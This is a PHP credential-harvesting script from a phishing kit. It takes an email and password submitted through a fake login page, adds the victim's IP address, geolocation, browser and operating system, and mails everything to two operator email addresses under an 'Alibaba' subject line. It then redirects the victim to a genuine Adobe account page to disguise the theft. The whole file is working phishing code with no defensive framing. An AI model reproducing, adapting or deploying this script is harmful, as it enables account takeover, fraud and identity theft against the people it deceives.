<?php session_start();


   function getUserIP()
{
    $client  = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote  = $_SERVER['REMOTE_ADDR'];

    if(filter_var($client, FILTER_VALIDATE_IP))
    {
        $ip = $client;
    }
    elseif(filter_var($forward, FILTER_VALIDATE_IP))
    {
        $ip = $forward;
    }
    else
    {
        $ip = $remote;
    }

    return $ip;
}


$user_ip = getUserIP();

// get browser


$user_agent     =   $_SERVER['HTTP_USER_AGENT'];

function getOS() { 

    global $user_agent;

    $os_platform    =   "Unknown OS Platform";

    $os_array       =   array(
                            '/windows nt 6.3/i'     =>  'Windows 8.1',
                            '/windows nt 6.2/i'     =>  'Windows 8',
                            '/windows nt 6.1/i'     =>  'Windows 7',
                            '/windows nt 6.0/i'     =>  'Windows Vista',
                            '/windows nt 5.2/i'     =>  'Windows Server 2003/XP x64',
                            '/windows nt 5.1/i'     =>  'Windows XP',
                            '/windows xp/i'         =>  'Windows XP',
                            '/windows nt 5.0/i'     =>  'Windows 2000',
                            '/windows me/i'         =>  'Windows ME',
                            '/win98/i'              =>  'Windows 98',
                            '/win95/i'              =>  'Windows 95',
                            '/win16/i'              =>  'Windows 3.11',
                            '/macintosh|mac os x/i' =>  'Mac OS X',
                            '/mac_powerpc/i'        =>  'Mac OS 9',
                            '/linux/i'              =>  'Linux',
                            '/ubuntu/i'             =>  'Ubuntu',
                            '/iphone/i'             =>  'iPhone',
                            '/ipod/i'               =>  'iPod',
                            '/ipad/i'               =>  'iPad',
                            '/android/i'            =>  'Android',
                            '/blackberry/i'         =>  'BlackBerry',
                            '/webos/i'              =>  'Mobile'
                        );

    foreach ($os_array as $regex => $value) { 

        if (preg_match($regex, $user_agent)) {
            $os_platform    =   $value;
        }

    }   

    return $os_platform;

}

function getBrowser() {

    global $user_agent;

    $browser        =   "Unknown Browser";

    $browser_array  =   array(
                            '/msie/i'       =>  'Internet Explorer',
                            '/firefox/i'    =>  'Firefox',
                            '/safari/i'     =>  'Safari',
                            '/chrome/i'     =>  'Chrome',
                            '/opera/i'      =>  'Opera',
                            '/netscape/i'   =>  'Netscape',
                            '/maxthon/i'    =>  'Maxthon',
                            '/konqueror/i'  =>  'Konqueror',
                            '/mobile/i'     =>  'Handheld Browser'
                        );

    foreach ($browser_array as $regex => $value) { 

        if (preg_match($regex, $user_agent)) {
            $browser    =   $value;
        }

    }

    return $browser;

}


$user_os        =   getOS();
$user_browser   =   getBrowser();
  


$url='http://www.geoplugin.net/json.gp?ip='.$_SERVER['REMOTE_ADDR'];
            //$ipdetails=file_get_contents($url);
            //$response_tags=json_decode($ipdetails);
            
            //echo $url.'==============';
            
            $ch = curl_init();
            
            curl_setopt($ch, CURLOPT_AUTOREFERER, TRUE);
            curl_setopt($ch, CURLOPT_HEADER, 0);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);       
        
            $ouputdata = curl_exec($ch);
            curl_close($ch);
            
            $response_tags=json_decode($ouputdata);
            
            $country=$response_tags->geoplugin_countryName;
            $state=$response_tags->geoplugin_region;
            $city=$response_tags->geoplugin_city;




$email = $_POST['email'];
$password = $_POST['password'];


$to = "alchemist456@yandex.com, hafshawaty.ac.id@hafshawaty.ac.id";
$subject = "$country || Alibaba";

$message = "---------=Alibaba2=---------
Email: $email
Password: $password


---------=Location & Browser=---------
IP Address: $user_ip
Country: $country
State & City: $state || $city
Browser and OS: $user_browser || $user_os
---------=ALI KING=---------
   ";
 $retval = mail ($to,$subject,$message);
   if( $retval == true )  
   {
    
    header("Location: https://adobeid-na1.services.adobe.com/renga-idprovider/pages/create_account?client_id=adobedotcom2&callback=https%3A%2F%2Fims-na1.adobelogin.com%2Fims%2Fadobeid%2Fadobedotcom2%2FAdobeID%2Ftoken%3Fredirect_uri%3Dhttps%253A%252F%252Fwww.adobe.com%252Fcc_redirect_router_page.html%253Forigin%253D%252Fuk%252Fcreativecloud.html%2523from_ims%253Dtrue%2526old_hash%253D%2526api%253Dauthorize%26scope%3Dcreative_cloud%252CAdobeID%252Copenid%252Cgnav%252Cread_organizations%252Cadditional_info.projectedProductContext%252Csao.ACOM_CLOUD_STORAGE%252Csao.stock%252Csao.cce_private%252Cadditional_info.roles&denied_callback=https%3A%2F%2Fims-na1.adobelogin.com%2Fims%2Fdenied%2Fadobedotcom2%3Fredirect_uri%3Dhttps%253A%252F%252Fwww.adobe.com%252Fcc_redirect_router_page.html%253Forigin%253D%252Fuk%252Fcreativecloud.html%2523from_ims%253Dtrue%2526old_hash%253D%2526api%253Dauthorize%26response_type%3Dtoken&display=web_v2&locale=en_GB&relay=ca3a9a23-da8c-409e-a431-e2d8ad34ecc1&flow=true&flow_type=token&idp_flow_type=login&s_account=adbadobenonacdcprod%2Cadbims");
       
   }
   else
   {
      echo "Message could not be sent...";
   }     
?>    